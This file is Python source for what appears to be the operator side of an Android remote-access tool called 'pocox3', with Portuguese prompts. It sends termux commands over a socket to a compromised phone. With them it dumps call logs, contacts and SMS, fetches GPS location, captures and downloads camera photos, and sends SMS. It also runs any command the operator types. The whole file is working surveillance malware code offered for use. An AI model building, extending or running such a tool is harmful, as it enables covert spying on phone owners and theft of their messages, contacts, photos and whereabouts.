import socket
import comm
from time import sleep
from sys import argv
from os import system
from random import choice
from colors import color
from rich.console import Console
from rich.table import Table

class Main():
    def __init__(self, host: str, port: int, log=False):
        self.host = host.strip()
        self.port = port
        self.filename = "pocox3.log"
        self.log = log
        self.banner = comm.banner()

    def exit(self):
        self.sock.close()
        print(color("red", "[-] Saindo..."))
        sleep(1)
        exit()

    def authorInfos(self):
        system("cat README.md")
        sleep(5)

    def generateLog(self, data):
        with open(self.filename, "a") as file:
            file.write(data+"\n"+60*"=")

    def getBanner(self):
        system("clear")
        print(color("blue", choice(self.banner)))

    def torch(self):
        text = color("green", "[1] LIGAR LANTERNA\n")+color("red", "[2] DESLIGAR LANTERNA\n")+color("blue", "O que quer fazer:> ")
        led = int(input(text))
        return "termux-torch on" if led == 1 else "termux-torch off"

    def speak(self):
        ttspeak = input(color("blue", "O que falar? "))
        return f"termux-tts-speak {ttspeak}"

    def sendSms(self):
        mensagem = input(color("green", "Sua mensagem: "))
        numero = input(color("red", "Número: "))
        return f"termux-sms-send -n {numero} {mensagem}"

    def callLog(self):
        return "termux-call-log"

    def smsList(self):
        return "termux-sms-list"

    def contactList(self):
        return "termux-contact-list"

    def Volume(self):
        vol = int(input(color("blue", "Min 0/Max 15\nDigite o Valor que Deseja: ")))
        return f"termux-volume music {vol}" if vol >= 0 and vol < 16 else "termux-volume music 15"

    def wallpaper(self):
        link = input(color("blue", "Link da Imagem: "))
        return f"termux-wallpaper -u {link}"

    def mediaPlayer(self):
        music = input(color("blue", "Digite o Caminho: "))
        return f"termux-media-player play {music}"

    def getPhoto(self):
        option = int(input(color("green", "[1] Camera Traseira\n")+color("blue", "[2] Camera Frontal\n:> ")))
        filename = input(color("red", "Salvar como? (.jpeg):> ")).strip()
        if option-1 in (0, 1) and filename.endswith(".jpeg"):
            command = f"termux-camera-photo -c {option-1} {filename}"
            self.sock.send(command.encode())
            with open(filename, "wb") as file:
                while True:
                    try:
                        data = self.sock.recv(9000000)
                    except TimeoutError:
                        print(color("green", "[+] Imagem salva."))
                        sleep(1)
                        return self.run()
                    except socket.error:
                        return self.run()
                    file.write(data)
        else:
            print(color("red", "Tente novamente..."))
            sleep(1)
            self.run()

    def getLocation(self, data):
        lat = data[data.find(": ")+2:data.find(",")]
        long = data[data.find(": ", 30)+2:data.find(",", 30)]
        return color("red", f"LATITUDE: {lat}\nLONGITUDE: {long}")

    def createSock(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((self.host, self.port))
        self.sock.settimeout(4)

    def sendCommand(self, command):
        self.sock.send(command.encode())
        try:
            self.data = self.sock.recv(10000).decode()
            print(color("green", "[+] Recebendo dados..."))
            sleep(0.5)
            if self.log:
                self.generateLog(self.data)
            else:
                try:
                    if "latitude" in self.data:
                        print(self.getLocation(self.data))
                        print(color("yellow", "[!] Pressione Control+C para Voltar."))
                        sleep(60)
                    print(color("red", self.data))
                    print(color("yellow", "[!] Pressione Control+C para Voltar."))
                    sleep(60)
                except KeyboardInterrupt:
                    print(color("green", "[+] Voltando a Tela Inicial..."))
                    sleep(1.5)
        except TimeoutError:
            if "latitude" in self.data:
                print(self.getLocation(self.data))
            return self.run()

        except socket.error:
            return self.run()

    def run(self):
        while True:
            c = 1
            self.createSock()
            self.getBanner()
            self.option = input(color("green", "Kira t justice:> "))
            if self.option == "1":
                table = Table()
                table.add_column("Opções", style="magenta")
                table.add_column("Comandos", style="cyan")
                table.add_column("Descrição", style="yellow")
                for k, v in comm.commands.items():
                    table.add_row(str(c), k, v)
                    c += 1
                console = Console()
                console.print(table)
                print("\x1b[34m└──>\x1b[37m", end="")
                self.option = input("pocox3" + color("red", "(option)") + ":> ")
                if self.option in ("1", "use 1"):
                    self.sendCommand(self.callLog())
                elif self.option in ("2", "use 2"):
                    self.getPhoto()
                elif self.option in ("3", "use 3"):
                    self.sendCommand(self.Volume())
                elif self.option in ("4", "use 4"):
                    self.sendCommand(self.contactList())
                elif self.option in ("5", "use 5"):
                    self.sendCommand(self.mediaPlayer())
                elif self.option in ("6", "use 6"):
                    self.sendCommand(self.speak())
                elif self.option in ("7", "use 7"):
                    self.sendCommand("termux-location")
                elif self.option in ("8", "use 8"):
                    self.sendCommand(self.smsList())
                elif self.option in ("9", "use 9"):
                    self.sendCommand(self.sendSms())
                elif self.option in ("10", "use 10"):
                    self.sendCommand(self.torch())
                elif self.option in ("11", "use 11"):
                    self.sendCommand(self.wallpaper())
            elif self.option == "2":
                self.authorInfos()
                continue
            elif self.option in ("3", "exit", "sair"):
                self.exit()
            elif self.option in ("4", 4):
                comando = input(color("yellow", "[+] Digite o Comando Todo: "))
                self.sendCommand(comando)


if len(argv) == 3:
    try:
        connect = Main(argv[1], int(argv[2]), log=False)
        connect.run()
    except ConnectionRefusedError:
        print(color("red", "[-] Host ou Porta Inválida."))
    except KeyboardInterrupt:
        print(color("red", "[-] Interrompido pelo Usuário."))

else:
    print(comm.usage())
    exit()

